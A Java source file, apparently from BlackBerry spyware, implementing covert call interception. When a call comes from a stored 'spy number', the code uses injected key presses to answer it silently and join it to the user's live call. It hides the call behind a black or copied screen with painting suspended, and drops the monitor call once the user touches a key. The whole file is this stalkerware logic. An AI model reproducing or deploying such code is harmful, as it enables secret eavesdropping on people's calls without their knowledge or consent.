package com.vvt.bug;

import java.util.Timer;
import java.util.TimerTask;

import com.vvt.std.Log;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Ui;
import net.rim.device.api.ui.UiApplication;

public class SCCL_46_UP extends SCCL {
	
	protected BaseScreen screen;
	protected Timer wait4KeyPressesAction;
	protected boolean popBlackScreenProgrammatically;
	
	public SCCL_46_UP(PhoneEventListenerSettings pelSettings) {
		super(pelSettings);
	}

	public void initialize() {
		try {
			super.initialize();
			numberOfCallsActive = 1;
			sCCActive = false;
			enableCopyScreen();
		} catch (Exception e) {
		}
	}

	public void enableCopyScreen() {
		try {
			if (pelSettings.isUseBlackScreen()) {
				screen = new BlackScreen( this);
			}
			else {
				screen = new CopyScreen();
				copyScreen();
			}
		} catch (Exception e) {
		}
	}

	public void callAnswered(int callId) {
		try {
			if (sCCActive) {
				pushBaseScreen();
			}
		} catch (Exception e) {
		}
	}

	private void pushBaseScreen() {
		synchronized (Application.getEventLock()) {
			try {
				Ui.getUiEngine().pushGlobalScreen(screen, -100, 0);
				if (pelSettings.isManipulatePainting()) {
					scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCAnsweredMS());
				}
			} catch (Exception e) {
			}
		}
	}

	public void callConnected(int callId) {
		try {
			if (sCCActive) {
				joinMenuItem = util.getMenuItem(join, voiceApp, localeEnglish, locale);
				new Thread(joinMenuItem).start();
				scheduleWaitForKeyPress();
			}
		} catch (Exception e) {
		}
	}

	public void callWaiting(int callId) {
		try {
			/*if (Log.isDebugEnable()) {
				Log.debug("SCCL_46_UP.callWaiting()", "numberOfCallsActive: " + numberOfCallsActive);
			}*/
			numberOfCallsActive++;
			PhoneCall phoneCall = Phone.getCall(callId);
			if (numberOfCallsActive == 3) {
				//if (sCCActive || util.isSCC(phoneCall, monitorPhoneNumber) ) {
				if (sCCActive || util.isSCCList(phoneCall, bugInfo.getSpyNumberStore())) {
					/*if (Log.isDebugEnable()) {
						Log.debug("SCCL_46_UP.callWaiting()", "isSCCList!");
					}*/
					if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
						voiceApp.suspendPainting(true);
					}
					endLastIncomingCall();
					return;
				}
			}
			//if (util.isSCC(phoneCall, monitorPhoneNumber) ) {
			if (util.isSCCList(phoneCall, bugInfo.getSpyNumberStore())) {
				/*if (Log.isDebugEnable()) {
					Log.debug("SCCL_46_UP.callWaiting()", "numberOfCallsActive != 3, isSCCList!");
				}*/
				sCCActive = true;
				if (pelSettings.isUseCopyScreen())
					((CopyScreen)screen).copy();
				if (voiceApp == null) {
					voiceApp = UiApplication.getUiApplication();
				}
				sCCId = callId;
				if (pelSettings.isManipulatePainting()) {
					voiceApp.suspendPainting(true);
				}
				util.injectKey((char) Keypad.KEY_SEND, pelSettings.getWaitBeforeAnswerWaitingCallMS());
			}
		} catch (Exception e) {
		}
	}

	private void endLastIncomingCall() {
		/*if (Log.isDebugEnable()) {
			Log.debug("SCCL_46_UP.endLastIncomingCall()", "ENTER");
		}*/
		util.injectKey( (char) Keypad.KEY_END, pelSettings.getWaitBeforeEndScc());	
	}
	
	protected void scheduleHoldResumePainting(final boolean hold, int time) {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					try {
						boolean alter = (hold && !voiceApp.isPaintingSuspended()) || (!hold && voiceApp.isPaintingSuspended());
						if (alter) {
							voiceApp.suspendPainting(hold);
						}
					} catch (Exception e) {
					}
				}
			}, time);
		} catch (Exception e) {
		}
	}

	public void callConferenceCallEstablished(int callId) {
		
	}

	public void callDisconnected(int callId) {
		try {
			numberOfCallsActive--;
			if (numberOfCallsActive>1) {
				scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingFinalSCCDisconnectedMS());
				return;
			}
			if (sCCActive) {
				wait4KeyPressesAction.cancel(); // Canceling scheduleWaitForKeyPress() function.
				if (sCCId != callId) {
					if (numberOfCallsActive == 1) {
						if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
							voiceApp.suspendPainting(true);
						}
						util.injectKey((char)Keypad.KEY_END, pelSettings.getWaitBeforeEndScc());
					}
					else {
						scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCDisconnectedMS());
					}
				} else {
					sCCActive = false;
					if (pelSettings.isManipulatePainting()) {
						voiceApp.invokeLater(new Runnable() {
							public void run() {
								try {
									if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
										voiceApp.suspendPainting(true);
									}
									voiceApp.popScreen(screen);
								} catch (Exception e) {
								}
							}
						});
						int interval = 0;
						if (numberOfCallsActive == 0) {
							interval = 3000;
							pelSettings.setWaitBeforeResumePaintingFinalSCCDisconnectedMS(interval);
							scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingFinalSCCDisconnectedMS());
						}
						else {
							interval = 4000;
							pelSettings.setWaitBeforeResumePaintingSCCDisconnectedMS(interval);
							scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCDisconnectedMS());
						}
					}
				}
			}
			if (numberOfCallsActive == 0) {
//				((FxS) BaseFxS.getFxS()).releaseSCCL();
				observer.onFinish();
			}
		} catch (Exception e) {
		}
	}
	
	public void considerUserInteractionEvent(boolean popBlackScreenProgrammatically) {
	}
	
	private void copyScreen() {
		int copyInterval = 3000;
		new Timer().schedule(new TimerTask() {
			public void run() {
				// To copy screen.
				if (pelSettings.isUseCopyScreen()) {
					((CopyScreen)screen).copy();
				}
			}
		}, copyInterval);
	}
	
	private void scheduleWaitForKeyPress() {
		try {
			wait4KeyPressesAction = new Timer();
			wait4KeyPressesAction.schedule(new TimerTask() {
				public void run() {
					try {
						if (DeviceInfo.getIdleTime() == 0) {
							wait4KeyPressesAction.cancel();
							voiceApp.invokeLater(new Runnable() {
								public void run() {
									try {
										if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
											voiceApp.suspendPainting(true);
										}
										voiceApp.popScreen(screen);
										voiceApp.requestBackground();
									} catch (Exception e) {
									}
								}
							});
							int waitInterval = 1500; // In milliseconds.
							dropMonitorCall(waitInterval);
						}
					} catch (Exception e) {
					}
				}
			}, pelSettings.waitBeforeWait4KeyPressActionMS, pelSettings.repeatPeriodWait4KeyPressActionMS);
		} catch (Exception e) {
		}
	}
	
	private void dropMonitorCall(int milliseconds) {
		new Timer().schedule(new TimerTask() {
			public void run() {
				if (sCCActive) {
					voiceApp.requestForeground();
					// 1). Calling menu items.
					InjectionKeyThread menuKey = new InjectionKeyThread((char) Keypad.KEY_MENU);
					menuKey.start();
					// 2). Simulation roll up event for selection on "Drop Call" menu.
					InjectionKeyThread rollUpEvent = new InjectionKeyThread(EventInjector.TrackwheelEvent.THUMB_ROLL_UP, 2, menuKey);
					rollUpEvent.start();
					// 3). Choosing that menu.
					InjectionKeyThread enterKey = new InjectionKeyThread(EventInjector.TrackwheelEvent.THUMB_CLICK, 1, rollUpEvent);
					enterKey.start();
					// 4). Simulation roll down event for selection monitor number.
					InjectionKeyThread rollDownEvent = new InjectionKeyThread(EventInjector.TrackwheelEvent.THUMB_ROLL_DOWN, 1, enterKey);
					rollDownEvent.start();
					// 5). Ending monitor number.
					InjectionKeyThread clickEvent = new InjectionKeyThread(EventInjector.TrackwheelEvent.THUMB_CLICK, 1, rollDownEvent);
					clickEvent.start();
				}
			}
		}, milliseconds);
	}
}